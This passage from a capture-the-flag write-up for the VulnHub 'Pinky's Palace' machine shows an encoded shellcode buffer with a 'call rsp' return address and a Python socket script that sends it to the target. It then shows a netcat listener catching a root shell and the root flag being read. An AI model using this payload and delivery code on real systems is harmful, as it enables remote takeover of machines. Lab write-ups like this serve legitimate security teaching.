buf += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x40\xb0\xfc\x68\x52\x27\xde"
buf += "\xcb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\x2a\x99\xa4\xf1\x38\x25\x81\xa1\x41\xee\xf3\x6d\x1a"
buf += "\xb0\x96\x72\x42\xb0\xfd\xd3\x92\x8f\x6d\xca\x11\xf8"
buf += "\x75\x8e\x38\x37\x84\xa1\x6a\xe8\xf3\x6d\x38\x24\x80"
buf += "\x83\xbf\x7e\x96\x49\x0a\x28\xdb\xbe\xb6\xda\xc7\x30"
buf += "\xcb\x6f\x65\xe4\x22\xd9\x92\x47\x21\x4f\xde\x98\x08"
buf += "\x39\x1b\x3a\x05\x6f\x57\x2d\x4f\xb5\xfc\x68\x52\x27"
buf += "\xde\xcb"
buf += "\xfb\x0c\x40" #0x400cfb  call rsp

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buf.encode('latin'))
    print("Done")
except:
    print("Error")
```

We set up a netcat listener in our case on port 443, and run the exploit.

```console
root@kali:~$ python3 exploit.py
Done
```

We have a root shell, and we can read de root flag.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.178] 34066
script -qc /bin/bash /dev/null
root@Pinkys-Palace:/daemon# cd /root
cd /root
root@Pinkys-Palace:/root# ls
ls
root.txt
root@Pinkys-Palace:/root# cat root.txt
cat root.txt

 ____  _       _          _     
|  _ \(_)_ __ | | ___   _( )___ 
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _                   
|  _ \ __ _| | __ _  ___ ___ 
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!   
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
root@Pinkys-Palace:/root#
```
